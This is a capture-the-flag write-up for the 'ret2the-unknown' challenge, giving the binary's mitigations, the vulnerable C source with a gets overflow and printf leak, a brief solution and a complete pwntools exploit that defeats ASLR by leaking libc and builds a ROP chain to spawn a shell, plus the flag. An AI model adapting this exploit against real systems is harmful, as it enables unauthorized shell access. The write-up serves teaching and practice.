# ret2the-unknown

## Challenge

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Source

```c
int main(void)
{
  char your_reassuring_and_comforting_we_will_arrive_safely_in_libc[32];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("that board meeting was a *smashing* success! rob loved the challenge!");
  puts("in fact, he loved it so much he sponsored me a business trip to this place called 'libc'...");
  puts("where is this place? can you help me get there safely?");

  // please i cant afford the medical bills if we crash and segfault
  gets(your_reassuring_and_comforting_we_will_arrive_safely_in_libc);

  puts("phew, good to know. shoot! i forgot!");
  printf("rob said i'd need this to get there: %llx\n", printf);
  puts("good luck!");
}
```

## Solution

The program gives us an unsafe call to `gets`, followed by a leak for the address of the `printf` function.

We can use the `gets` call to jump back to the start of the program.

Before we return to the start, we will read the leak from normal program execution.

Once we have the leak and another `gets` call, we can overwrite the buffer and set up a ROP chain to call `system("/bin/sh")`.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 31568 ret2the-unknown
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2the-unknown')
libc = ELF('libc-2.28.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 31568)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.recvlines(2)

payload = flat({
    0x20+8: exe.sym["main"]
    })
io.sendline(payload)

io.recvuntil(": ")

leak = io.recvuntil("\n", drop=True)
libc.address = int(leak, 16) - libc.sym['printf']
io.success(hex(libc.address))

rop = ROP(exe)

payload = flat({
    0x20+8: [
        rop.find_gadget(['pop rdi', 'ret'])[0],
        next(libc.search(b'/bin/sh')),
        libc.sym['system'],
        ]
    })
io.sendline(payload)

io.interactive()
```

## Flag

`flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing}`

